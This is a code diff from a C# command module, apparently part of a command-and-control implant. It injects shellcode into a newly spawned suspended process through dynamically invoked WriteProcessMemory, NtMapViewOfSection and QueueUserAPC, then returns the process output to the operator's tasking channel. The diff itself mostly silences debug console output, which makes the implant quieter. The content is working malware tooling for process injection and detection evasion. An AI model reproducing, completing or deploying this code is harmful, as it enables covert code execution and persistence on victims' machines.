@@ -81,7 +81,7 @@ namespace Engineer.Commands
                 si.StartupInfo.dwFlags = WinAPIs.Kernel32.STARTF_USESHOWWINDOW | (int)WinAPIs.Kernel32.CreationFlags.ExtendedStartupInfoPresent | WinAPIs.Kernel32.STARTF_USESTDHANDLES;
 
                 // spawn new process 
-                Console.WriteLine("attempting to create new process");
+                Tasking.FillTaskResults($"Attempting to create new process", task, EngTaskStatus.Running,TaskResponseType.String);
                 var createProcessParameters = new object[] { $@"{SpawnTo.spawnToPath}", null, ta, pa, true, (uint)0x4, IntPtr.Zero, "C:\\Windows\\System32", si, pi };
                 object successCreateProcess = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "CreateProcessW", typeof(WinApiDynamicDelegate.CreateProcessW), createProcessParameters);
                 // makes sure we have access to the correct (out) pi values from the API invoke
@@ -92,7 +92,6 @@ namespace Engineer.Commands
                 {
                     bool? MapSuccess = null;
                     DateTime startTime = DateTime.Now;
-                    Console.WriteLine($"start time is {startTime}");
                     Thread theThread = new Thread(() =>
                     {
                         MapSuccess = MapViewLoadShellcode(shellcode, pi.hProcess, pi.hThread);
@@ -115,9 +114,9 @@ namespace Engineer.Commands
                             bool peeked =  WinAPIs.Kernel32.PeekNamedPipe(outR_handle, null, 0, ref bytesPeeked,ref bytesAvailable, ref bytesLeftThisMessage);
                             if (peeked == false)
                             {
-                                Console.WriteLine($"failed to peek pipe with error code {Marshal.GetLastWin32Error()}");
+                                //Console.WriteLine($"failed to peek pipe with error code {Marshal.GetLastWin32Error()}");
                             }
-                            Console.WriteLine($"peeked {bytesAvailable} bytes from pipe");
+                            //Console.WriteLine($"peeked {bytesAvailable} bytes from pipe");
                             if (task.cancelToken.IsCancellationRequested)
                             {
                                 theThread.Abort();
@@ -129,12 +128,12 @@ namespace Engineer.Commands
                                 out uint bytesRead, IntPtr.Zero);
                             if (readSuccess == false)
                             {
-                                Console.WriteLine($"read failed with error code {Marshal.GetLastWin32Error()}");
+                                //Console.WriteLine($"read failed with error code {Marshal.GetLastWin32Error()}");
                             }
 
                             if (bytesRead > 0)
                             {
-                                Console.WriteLine($"read {bytesRead} bytes from pipe");
+                                //Console.WriteLine($"read {bytesRead} bytes from pipe");
                                 Output = Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
                                 Tasking.FillTaskResults(Output, task, EngTaskStatus.Running,TaskResponseType.String);
                                 buffer = new byte[1024];
@@ -142,12 +141,12 @@ namespace Engineer.Commands
                             }
                             else if (bytesRead == 0 && DateTime.Now.Subtract(startTime).TotalMinutes > 1)
                             {
-                                Console.WriteLine("no bytes read from pipe in 1 minute");
+                                //Console.WriteLine("no bytes read from pipe in 1 minute");
                                 break;
                             }
                             else
                             {
-                                Console.WriteLine("Sleeping no data from pipe");
+                                //Console.WriteLine("Sleeping no data from pipe");
                                 Thread.Sleep(1000);
                             }
                         } 
@@ -158,7 +157,7 @@ namespace Engineer.Commands
                         Tasking.FillTaskResults("[-]MapViewLoadShellcode failed", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     }
                     //once the process is done, read the output from the pipe and send it back to the server
-                    Console.WriteLine("Exited while loop");
+                   // Console.WriteLine("Exited while loop");
                     var buffer2 = new byte[1024];
                     var readSuccess2 = WinAPIs.Kernel32.ReadFile(outR_handle, buffer2, (uint)buffer2.Length, out uint bytesRead2, IntPtr.Zero);
                     Output = Encoding.UTF8.GetString(buffer2, 0, (int)bytesRead2);
@@ -168,16 +167,16 @@ namespace Engineer.Commands
                 
                 catch (Exception ex)
                 {
-                    Console.WriteLine(ex.Message);
-                    Console.WriteLine(ex.StackTrace);
+                   // Console.WriteLine(ex.Message);
+                   // Console.WriteLine(ex.StackTrace);
                     Tasking.FillTaskResults(ex.Message, task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 }
                 
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+               // Console.WriteLine(e.Message);
+                //Console.WriteLine(e.StackTrace);
             }
         }
         
@@ -211,7 +210,7 @@ namespace Engineer.Commands
             // invoke the api call, pass the dll, function name, delegate type, parameters        
             reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "WriteProcessMemory", typeof(WinApiDynamicDelegate.WriteProcessMemory), writeProcessParameters, false);
             numberOfBytes = (IntPtr)writeProcessParameters[4];
-            Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");
+           // Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");
 
             // dinvoke map view of section remote which basically copies shellcode
             IntPtr remoteBaseAddress = new IntPtr();
@@ -219,7 +218,7 @@ namespace Engineer.Commands
             // invoke the api call, pass the dll, function name, delegate type, parameters        
             reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
             remoteBaseAddress = (IntPtr)mapViewParameters[2];
-            Console.WriteLine($"Mapped view to target");
+           // Console.WriteLine($"Mapped view to target");
 
             // Queue user APC
             var queueUserParameters = new object[] { remoteBaseAddress, hThread, (uint)0 };
@@ -236,12 +235,12 @@ namespace Engineer.Commands
 
             if ((uint)createThreadResult == 1)
             {
-                Console.WriteLine("resumed thread");
+               // Console.WriteLine("resumed thread");
                 return true;
             }
             else
             {
-                Console.WriteLine("resumed thread failed");
+               // Console.WriteLine("resumed thread failed");
                 return false;
             }
         }
